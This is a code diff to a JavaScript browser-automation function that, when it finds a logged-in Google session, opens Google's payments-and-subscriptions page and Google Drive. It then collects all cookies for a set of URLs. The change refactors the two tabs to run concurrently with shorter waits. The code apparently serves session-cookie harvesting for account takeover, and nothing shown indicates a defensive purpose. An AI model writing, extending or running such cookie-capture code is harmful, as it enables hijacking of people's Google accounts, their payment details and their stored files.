@@ -2375,48 +2375,54 @@ export async function captureMultiTabCookies(browser, page, domain, browserId) {
         let accountCookies = [];
         let driveCookies = [];
 
-        // 2. If Google session and browser is still open, visit Tab 2 (Wallet) & Tab 3 (Drive)
+        // 2. If Google session and browser is still open, visit Tab 2 (Wallet) & Tab 3 (Drive) concurrently
         if (isGoogle && browser && page && !page.isClosed()) {
-            // Tab 2: Wallet & Subscriptions
             let walletPage = null;
-            try {
-                logger.info(`[captureMultiTabCookies][${browserId}] Opening Tab 2: Wallet & Subscriptions...`);
-                walletPage = await browser.newPage();
-                await walletPage.goto('https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app', {
-                    waitUntil: 'networkidle2',
-                    timeout: 30000
-                }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 navigation warning: ${err.message}`));
-
-                await new Promise(r => setTimeout(r, 2000));
-                accountCookies = await walletPage.cookies(...allUrls).catch(() => []);
-                logger.info(`[captureMultiTabCookies][${browserId}] Tab 2 (Wallet & Subscriptions) captured ${accountCookies.length} cookies.`);
-            } catch (walletErr) {
-                logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 failed: ${walletErr.message}`);
-            } finally {
-                if (walletPage && !walletPage.isClosed()) {
-                    await walletPage.close().catch(() => {});
-                }
-            }
-
-            // Tab 3: Google Drive
             let drivePage = null;
             try {
-                logger.info(`[captureMultiTabCookies][${browserId}] Opening Tab 3: Google Drive...`);
-                drivePage = await browser.newPage();
-                await drivePage.goto('https://drive.google.com/drive/u/0/home', {
-                    waitUntil: 'networkidle2',
-                    timeout: 30000
-                }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 navigation warning: ${err.message}`));
+                logger.info(`[captureMultiTabCookies][${browserId}] Opening Tab 2 (Wallet) & Tab 3 (Drive) concurrently...`);
+                [walletPage, drivePage] = await Promise.all([
+                    browser.newPage().catch(err => { logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 newPage failed: ${err.message}`); return null; }),
+                    browser.newPage().catch(err => { logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 newPage failed: ${err.message}`); return null; })
+                ]);
 
-                await new Promise(r => setTimeout(r, 2000));
-                driveCookies = await drivePage.cookies(...allUrls).catch(() => []);
-                logger.info(`[captureMultiTabCookies][${browserId}] Tab 3 (Drive) captured ${driveCookies.length} cookies.`);
-            } catch (driveErr) {
-                logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 failed: ${driveErr.message}`);
+                await Promise.all([
+                    (async () => {
+                        if (!walletPage) return;
+                        try {
+                            await walletPage.goto('https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app', {
+                                waitUntil: 'domcontentloaded',
+                                timeout: 15000
+                            }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 navigation warning: ${err.message}`));
+                            await new Promise(r => setTimeout(r, 1500));
+                            accountCookies = await walletPage.cookies(...allUrls).catch(() => []);
+                            logger.info(`[captureMultiTabCookies][${browserId}] Tab 2 (Wallet & Subscriptions) captured ${accountCookies.length} cookies.`);
+                        } catch (walletErr) {
+                            logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 failed: ${walletErr.message}`);
+                        }
+                    })(),
+                    (async () => {
+                        if (!drivePage) return;
+                        try {
+                            await drivePage.goto('https://drive.google.com/drive/u/0/home', {
+                                waitUntil: 'domcontentloaded',
+                                timeout: 15000
+                            }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 navigation warning: ${err.message}`));
+                            await new Promise(r => setTimeout(r, 1500));
+                            driveCookies = await drivePage.cookies(...allUrls).catch(() => []);
+                            logger.info(`[captureMultiTabCookies][${browserId}] Tab 3 (Drive) captured ${driveCookies.length} cookies.`);
+                        } catch (driveErr) {
+                            logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 failed: ${driveErr.message}`);
+                        }
+                    })()
+                ]);
+            } catch (multiTabErr) {
+                logger.warn(`[captureMultiTabCookies][${browserId}] Concurrent multi-tab failed: ${multiTabErr.message}`);
             } finally {
-                if (drivePage && !drivePage.isClosed()) {
-                    await drivePage.close().catch(() => {});
-                }
+                await Promise.all([
+                    walletPage && !walletPage.isClosed() ? walletPage.close().catch(() => {}) : null,
+                    drivePage && !drivePage.isClosed() ? drivePage.close().catch(() => {}) : null
+                ]);
             }
         }
 
